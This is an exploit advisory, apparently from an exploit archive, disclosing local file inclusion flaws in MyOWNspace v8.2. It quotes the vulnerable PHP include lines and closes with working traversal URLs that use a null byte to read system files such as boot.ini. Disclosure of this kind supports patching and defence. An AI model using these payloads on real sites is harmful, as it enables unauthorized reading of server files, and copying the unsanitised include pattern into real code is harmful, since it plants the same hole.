@@ -1,0 +1,52 @@
+===========================================================================
+( #Topic    : MyOWNspace_v8.2
+( #Bug type : multi local file include
+( #Download : http://sourceforge.net/project/platformdownload.php?group_id=174729
+( #Advisory : 
+
+===========================================================================
+( #Author : ItSecTeam
+( #Email  : Bug@ITSecTeam.com
+( #Website: http://www.itsecteam.com
+( #Forum  : http://forum.ITSecTeam.com
+( #discovered by : ahmadbady
+
+vuls:===================================================================
+path/graph.php
+
+if (isset($_GET['go'])) {$go=$_GET['go']; line 28   
+
+$i=$go;                                   line 30   
+.
+.
+.
+$friends="myownfriends/friends.".$i.".php";  line 38
+include $friends;                            line 39
+.
+.
+.
+.
+.
+$friends="myownfriends/friends.".$i.".php"; line 74  
+include $friends;                           line 75  
+---------------------------------------------------------------------------
+path/myowngraph.php  eror graph.php line 39;
+
+if (isset($_GET['go'])) {$go=$_GET['go']; line 28
+
+$i=$go;                                    line 29
+
+include $friends; line 39
+---------------------------------------------------------------------------
+path/showmyownfriends.php
+
+$conf_file="myownfriends/friends.".$_GET['go'].".php"; line 3
+
+include $conf_file;                                    line 17 
+---------------------------------------------------------------------------
+exploit:===================================================================
+
+path/graph.php?go=../../../../../../../boot.ini%00
+path/myowngraph.php?go=../../../../../../../boot.ini%00
+path/showmyownfriends.php?go=../../../../../../../boot.ini%00
+---------------------------------------------------------------------------
